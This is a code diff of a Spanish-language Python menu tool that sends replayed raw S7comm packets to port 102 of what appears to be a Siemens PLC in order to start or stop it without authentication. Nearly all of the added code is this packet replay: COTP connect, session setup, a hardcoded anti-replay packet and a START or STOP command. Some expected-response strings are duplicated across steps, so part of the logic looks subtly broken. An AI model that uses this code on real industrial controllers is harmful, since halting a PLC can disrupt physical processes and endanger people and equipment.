@@ -42,6 +42,179 @@ def fDeterminarSiIPoFQDN(pHost):
   return False
 
 
+def fEncenderPLC(pHost):
+  # Primer payload: Solicitud de comunicación COTP para encendido/apagado del PLC
+  COTP_RQ = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
+  
+  # Segundo payload: Solicitud de comunicación S7comm
+  S7_COMM_RQ = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+  
+  # Tercer payload: Anti-replay
+  S7_COMM_ANTI = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
+  
+  # Cuarto payload: START7 para encender el PLC
+  START7 = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'
+  
+  # Respuestas esperadas
+  RESP_COTP_RQ = '030000231ed00064000b00c0010ac1020600c20f53494d415449432d524f4f542d4553'
+  RESP_S7_COMM_RQ = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
+  RESP_S7_COMM_ANTI = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
+  RESP_START7 = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
+  
+  try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(5)
+    s.connect((pHost, 102))
+    
+    # 1. Enviar primer payload: COTP_RQ
+    s.send(bytearray.fromhex(COTP_RQ))
+    data = s.recv(1024)
+    if not data:
+      print("No se recibió respuesta al enviar COTP_RQ")
+      s.close()
+      return
+    
+    data_hex = data.hex()
+    print(f"Respuesta a COTP_RQ: {data_hex}")
+    
+    # Verificar que la respuesta sea la esperada
+    if data_hex != RESP_COTP_RQ:
+      print("La respuesta a COTP_RQ no es la esperada. Abortando.")
+      s.close()
+      return
+      
+    # 2. Enviar segundo payload: S7_COMM_RQ
+    s.send(bytearray.fromhex(S7_COMM_RQ))
+    data = s.recv(1024)
+    if not data:
+      print("No se recibió respuesta al enviar S7_COMM_RQ")
+      s.close()
+      return
+    
+    data_hex = data.hex()
+    print(f"Respuesta a S7_COMM_RQ: {data_hex}")
+    
+    # Verificar que la respuesta sea la esperada
+    if data_hex != RESP_S7_COMM_RQ:
+      print("La respuesta a S7_COMM_RQ no es la esperada. Abortando.")
+      s.close()
+      return
+    
+    # 3. Enviar tercer payload: S7_COMM_ANTI
+    s.send(bytearray.fromhex(S7_COMM_ANTI))
+    data = s.recv(1024)
+    if not data:
+      print("No se recibió respuesta al enviar S7_COMM_ANTI")
+      s.close()
+      return
+    
+    data_hex = data.hex()
+    print(f"Respuesta a S7_COMM_ANTI: {data_hex}")
+    
+    # Verificar que la respuesta sea la esperada
+    if data_hex != RESP_S7_COMM_ANTI:
+      print("La respuesta a S7_COMM_ANTI no es la esperada. Abortando.")
+      s.close()
+      return
+    
+    # 4. Enviar cuarto payload: START7
+    s.send(bytearray.fromhex(START7))
+    data = s.recv(1024)
+    if not data:
+      print("No se recibió respuesta al enviar START7")
+      s.close()
+      return
+    
+    data_hex = data.hex()
+    print(f"Respuesta a START7: {data_hex}")
+    
+    # Verificar que la respuesta sea la esperada
+    if data_hex != RESP_START7:
+      print("La respuesta a START7 no es la esperada. Abortando.")
+      s.close()
+      return
+      
+    print("Starting the PLC... Well Done!")
+  except socket.timeout:
+    print("Se agotó el tiempo de espera al comunicarse con el PLC")
+  except Exception as e:
+    print(f"Error al conectar o comunicarse con el PLC: {e}")
+  finally:
+    s.close()
+
+
+def fApagarPLC(pHost):
+  # Primer payload: Solicitud de comunicación COTP para encendido/apagado del PLC
+  COTP_RQ = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
+  
+  # Segundo payload: Solicitud de comunicación S7comm
+  S7_COMM_RQ = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+  
+  # Tercer payload: Anti-replay
+  S7_COMM_ANTI = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
+  
+  # Cuarto payload: STOP7 para apagar el PLC
+  STOP7 = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
+  
+  try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(5)
+    s.connect((pHost, 102))
+    
+    # 1. Enviar primer payload: COTP_RQ
+    s.send(bytearray.fromhex(COTP_RQ))
+    data = s.recv(1024)
+    if not data:
+      print("No se recibió respuesta al enviar COTP_RQ")
+      s.close()
+      return
+    print(f"Respuesta a COTP_RQ: {data.hex()}")
+      
+    # 2. Enviar segundo payload: S7_COMM_RQ
+    s.send(bytearray.fromhex(S7_COMM_RQ))
+    data = s.recv(1024)
+    if not data:
+      print("No se recibió respuesta al enviar S7_COMM_RQ")
+      s.close()
+      return
+    print(f"Respuesta a S7_COMM_RQ: {data.hex()}")
+    
+    # 3. Enviar tercer payload: S7_COMM_ANTI
+    s.send(bytearray.fromhex(S7_COMM_ANTI))
+    data = s.recv(1024)
+    if not data:
+      print("No se recibió respuesta al enviar S7_COMM_ANTI")
+      s.close()
+      return
+    print(f"Respuesta a S7_COMM_ANTI: {data.hex()}")
+    
+    # 4. Enviar cuarto payload: STOP7
+    s.send(bytearray.fromhex(STOP7))
+    data = s.recv(1024)
+    if not data:
+      print("No se recibió respuesta al enviar STOP7")
+      s.close()
+      return
+    print(f"Respuesta a STOP7: {data.hex()}")
+      
+    print("Stopping the PLC... Well Done!")
+  except socket.timeout:
+    print("Se agotó el tiempo de espera al comunicarse con el PLC")
+  except Exception as e:
+    print(f"Error al conectar o comunicarse con el PLC: {e}")
+  finally:
+    s.close()
+
+
+
+
+
+
+
+
+
+
+
 def fConectar(pHost):
   print(f"Intentando conectar con {pHost} en el puerto 102...")
   vSocketPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -87,132 +260,6 @@ def fModificarPayload(pPayload, pAntiReplay):
   """ Modifica el payload con el valor anti-replay calculado. """
   vAntiHex = hex(pAntiReplay)[2:].zfill(2)  # Asegurar formato hexadecimal de 2 caracteres
   return pPayload[:46] + vAntiHex[0] + pPayload[47:48] + vAntiHex[1] + pPayload[48:]
-
-
-def fEncenderPLC(pHost):
-  print(f"Intentando conectar con {pHost} en el puerto 102...")
-  vSocketPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  vSocketPLC.settimeout(5)
-  
-  try:
-    vSocketPLC.connect((pHost, 102))
-    print("\n  Conexión establecida.")
-  except socket.error as e:
-    print(f"\n  Error al conectar con el PLC: {e}")
-    return
-
-  vSolCommCOTP =     '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
-  vSolCommS7 =       '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
-  vPayloadEncender = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'
-
-  # Enviar COTP
-  try:
-    vSocketPLC.send(bytearray.fromhex(vSolCommCOTP))
-    vResp = vSocketPLC.recv(1024)
-    if vResp:
-      print(f"\n  Respuesta del PLC (COTP): {vResp.hex()}\n")
-    else:
-      print("\n  No se recibió respuesta del PLC (COTP).\n")
-      vSocketPLC.close()
-      return
-  except socket.timeout:
-    print("\n  Se esperó 5 segundos y el PLC no respondió (COTP).")
-    vSocketPLC.close()
-    return
-
-  # Enviar S7
-  try:
-    vSocketPLC.send(bytearray.fromhex(vSolCommS7))
-    vResp = vSocketPLC.recv(1024)
-    if vResp:
-      print(f"\n  Respuesta del PLC (S7): {vResp.hex()}\n")
-    else:
-      print("\n  No se recibió respuesta del PLC (S7).\n")
-      vSocketPLC.close()
-      return
-  except socket.timeout:
-    print("\n  Se esperó 5 segundos y el PLC no respondió (S7).")
-    vSocketPLC.close()
-    return
-
-  # Enviar comando de encendido
-  try:
-    vSocketPLC.send(bytearray.fromhex(vPayloadEncender))
-    vResp = vSocketPLC.recv(1024)
-    if vResp:
-      print(f"\n  Respuesta del PLC (Encendido): {vResp.hex()}\n")
-    else:
-      print("\n  No se recibió respuesta del PLC (Encendido).\n")
-  except socket.timeout:
-    print("\n  Se esperó 5 segundos y el PLC no respondió (Encendido).")
-    vSocketPLC.close()
-    return
-
-  print("\n  PLC iniciado correctamente \n.")
-  vSocketPLC.close()
-
-
-def fApagarPLC(vHost):
-  print(f"Intentando conectar con {vHost} en el puerto 102...")
-  vSocketPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  vSocketPLC.settimeout(5)
-  
-  try:
-    vSocketPLC.connect((vHost, 102))
-    print("\n  Conexión establecida.")
-  except socket.error as e:
-    print(f"\n  Error al conectar con el PLC: {e}")
-    return
-
-  vSolCommCOTP =   '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
-  vSolCommS7 =     '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
-  vPayloadApagar = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
-
-  # Enviar COTP
-  try:
-    vSocketPLC.send(bytearray.fromhex(vSolCommCOTP))
-    vResp = vSocketPLC.recv(1024)
-    if vResp:
-      print(f"\n  Respuesta del PLC (COTP): {vResp.hex()}\n")
-    else:
-      print("\n  No se recibió respuesta del PLC (COTP).\n")
-      vSocketPLC.close()
-      return
-  except socket.timeout:
-    print("\n  Se esperó 5 segundos y el PLC no respondió (COTP).")
-    vSocketPLC.close()
-    return
-
-  # Enviar S7
-  try:
-    vSocketPLC.send(bytearray.fromhex(vSolCommS7))
-    vResp = vSocketPLC.recv(1024)
-    if vResp:
-      print(f"\n  Respuesta del PLC (S7): {vResp.hex()}\n")
-    else:
-      print("\n  No se recibió respuesta del PLC (S7).\n")
-      vSocketPLC.close()
-      return
-  except socket.timeout:
-    print("\n  Se esperó 5 segundos y el PLC no respondió (S7).")
-    vSocketPLC.close()
-    return
-
-  # Enviar comando de apagado
-  try:
-    vSocketPLC.send(bytearray.fromhex(vPayloadApagar))
-    vResp = vSocketPLC.recv(1024)
-    if vResp:
-      print(f"\n  Respuesta del PLC (Apagado): {vResp.hex()}\n")
-    else:
-      print("\n  No se recibió respuesta del PLC (Apagado).\n")
-  except socket.timeout:
-    print("\n  Se esperó 5 segundos y el PLC no respondió (Apagado).")
-    vSocketPLC.close()
-    return
-
-  print("\n  PLC detenido correctamente. \n")
-  vSocketPLC.close()
 
 
 def fEncenderSalida(vHost, salida, nombre):
@@ -374,9 +421,9 @@ def fMenu(stdscr, vHost):
 
       try:
         if menu[current_row] == "Encender PLC":
-          fEncenderPLC2(vHost)
+          fEncenderPLC(vHost)
         elif menu[current_row] == "  Apagar PLC":
-          fApagarPLC2(vHost)
+          fApagarPLC(vHost)
         elif menu[current_row] == "Encender salida %Q0.0":
           fEncenderSalida(vHost, '%Q0.0', 'Salida %Q0.0')
         elif menu[current_row] == "  Apagar salida %Q0.0":
